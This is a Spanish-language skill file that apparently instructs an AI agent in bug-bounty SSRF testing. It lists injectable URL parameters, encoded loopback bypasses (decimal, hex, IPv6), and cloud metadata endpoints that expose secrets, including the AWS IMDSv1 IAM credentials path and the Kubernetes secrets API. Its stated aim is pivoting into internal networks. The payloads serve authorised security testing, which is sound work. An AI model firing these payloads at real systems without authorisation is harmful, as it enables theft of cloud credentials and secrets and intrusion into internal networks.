---
name: bug-bounty-ssrf
description: Identificación y explotación de vulnerabilidades Server-Side Request Forgery (SSRF). Incluye bypasses de esquemas URL, filtros IP/DNS rebinding y acceso a servicios Cloud Metadata (AWS IMDSv1/v2, GCP, Azure, Kubernetes).
---

# Skill: Server-Side Request Forgery (SSRF) & Internal Pivot

Esta habilidad instruye al agente en la identificación de puntos de entrada donde la aplicación web realiza peticiones HTTP hacia URLs suministradas por el usuario (webhooks, importación de imágenes, vista previa de enlaces, PDF generators) y cómo pivotar hacia redes internas y metadata de la nube.

## 📌 Puntos de Entrada Comunes
- Parámetros de URL: `url=`, `file=`, `path=`, `dest=`, `redirect=`, `feed=`, `site=`, `val=`, `uri=`.
- Carga de archivos por URL o importación de avatares.
- Generadores de PDF a partir de HTML/URLs (wkhtmltopdf, Puppeteer).
- Webhooks de integración (GitHub webhooks, Slack webhooks, Zapier integrations).

---

## 🛠️ Vectores de Prueba y Targets Sensibles

### 1. Loopback Localhost Bypasses
- `http://127.0.0.1:80` / `http://localhost`
- `http://2130706433` (Decimal IP)
- `http://0x7f000001` (Hexadecimal IP)
- `http://0.0.0.0` / `http://0/`
- `http://127.1` / `http://127.0.0.1.nip.io`
- IPv6: `http://[::]:80/` / `http://[0000::1]:80/`

### 2. Endpoints de Cloud Metadata (Objetivos de Máximo Impacto)
- **AWS EC2 Metadata (IMDSv1)**:
  `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **GCP (Google Cloud Platform)**:
  `http://metadata.google.internal/computeMetadata/v1/` (Requiere Header `Metadata-Flavor: Google`)
- **Azure Metadata**:
  `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Requiere Header `Metadata: true`)
- **Kubernetes Secrets / OpenShift**:
  `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`

---

## 📚 Bypasses y Referencias de Write-ups

Consulta la guía detallada de bypasses de DNS Rebinding e IP Blacklists:
[ssrf-cloud-bypasses.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-ssrf/references/ssrf-cloud-bypasses.md)
